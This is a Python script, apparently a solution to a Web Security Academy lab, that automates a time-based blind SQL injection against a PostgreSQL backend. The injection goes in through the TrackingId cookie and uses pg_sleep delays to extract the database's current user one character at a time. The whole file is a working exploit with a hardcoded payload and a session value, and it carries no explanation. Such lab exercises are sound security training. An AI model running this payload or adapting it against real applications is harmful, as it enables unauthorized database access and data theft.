#!/usr/bin/python3
##
import requests
import string
import urllib.parse
##
chars=string.printable
Part1="'||+(SELECT+CASE+WHEN+(current_user+like('"
Part2="%25'))+THEN+pg_sleep(10)ELSE+pg_SLEEP(0)+END)--+- session=P7HQ11CdfoRyMhQ9Hq15rMBKHKRaVKnw"
##
def get_single_character(URL,user,found):
    for X in chars:
        send=Part1+user+urllib.parse.quote(X)+Part2
        r=requests.get(URL,cookies={"TrackingId":send})
        print(f"{X}\r",end="")
        if(r.elapsed.total_seconds()>=10):
            user+=X
            if(user[-1]=='%'):
                found=True
            break
    print()
    #print(user)
    return found,user
##
def main(URL):
    found=False
    user=""
    while(not found):
        found,user=get_single_character(URL,user,found)
    user=user.split('%')[0]
    print(f"{user}")
#
main("https://0a9c006003fccb9f8160344a00ed00e4.web-security-academy.net/")